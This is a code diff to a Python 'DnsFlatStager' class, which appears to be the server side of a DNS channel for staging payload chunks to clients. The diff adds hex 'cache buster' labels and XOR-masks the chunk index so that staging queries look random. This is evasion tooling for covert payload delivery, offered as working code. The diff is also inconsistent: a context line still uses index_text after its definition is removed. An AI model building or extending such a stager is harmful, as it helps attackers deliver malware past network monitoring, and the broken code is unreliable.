@@ -14,6 +14,10 @@ from ...logging_util import log_event
 
 
 class DnsFlatStager(object):
+    _CACHE_BUSTER_PREFIX = 'r-'
+    _CACHE_BUSTER_HEX_LEN = 8
+    _INDEX_HEX_LEN = 8
+
     def __init__(self, base_domain, flat_chunks, flat_count, flat_meta,
                  flat_chunk_size, rtype, cname_suffix, label_max_len, logger,
                  send_response, send_empty_response):
@@ -102,6 +106,48 @@ class DnsFlatStager(object):
                 return False
         return True
 
+    def _cache_label_mask(self, label):
+        if not label:
+            return None
+        if isinstance(label, bytes):
+            try:
+                label = label.decode('ascii')
+            except UnicodeError:
+                return None
+        label = label.lower()
+        if not label.startswith(self._CACHE_BUSTER_PREFIX):
+            return None
+        hex_text = label[len(self._CACHE_BUSTER_PREFIX):]
+        if len(hex_text) != self._CACHE_BUSTER_HEX_LEN:
+            return None
+        for ch in hex_text:
+            if ch not in '0123456789abcdef':
+                return None
+        try:
+            return int(hex_text, 16)
+        except ValueError:
+            return None
+
+    def _decode_index_label(self, label, mask):
+        if not label:
+            return None
+        if isinstance(label, bytes):
+            try:
+                label = label.decode('ascii')
+            except UnicodeError:
+                return None
+        label = label.lower()
+        if len(label) != self._INDEX_HEX_LEN:
+            return None
+        for ch in label:
+            if ch not in '0123456789abcdef':
+                return None
+        try:
+            value = int(label, 16)
+        except ValueError:
+            return None
+        return value ^ mask
+
     @property
     def enabled(self):
         return self._enabled
@@ -121,7 +167,8 @@ class DnsFlatStager(object):
         if len(parts) != 2:
             return False
         cache_label, selector = parts
-        if not cache_label or self._is_base32_label(cache_label):
+        mask = self._cache_label_mask(cache_label)
+        if mask is None:
             return False
         if selector == 'count':
             if not self._flat_meta:
@@ -151,8 +198,8 @@ class DnsFlatStager(object):
                 },
             )
             return True
-        index_text = selector
-        if len(index_text) != 5 or not index_text.isdigit():
+        index = self._decode_index_label(selector, mask)
+        if index is None:
             self._send_empty_response(
                 query_id, qname, qtype, addr,
                 reason='flat_invalid',
@@ -166,7 +213,6 @@ class DnsFlatStager(object):
                 lambda: {'dns_id': query_id, 'index': index_text},
             )
             return True
-        index = int(index_text)
         if index < 1 or index > self._flat_count:
             self._send_empty_response(
                 query_id, qname, qtype, addr,
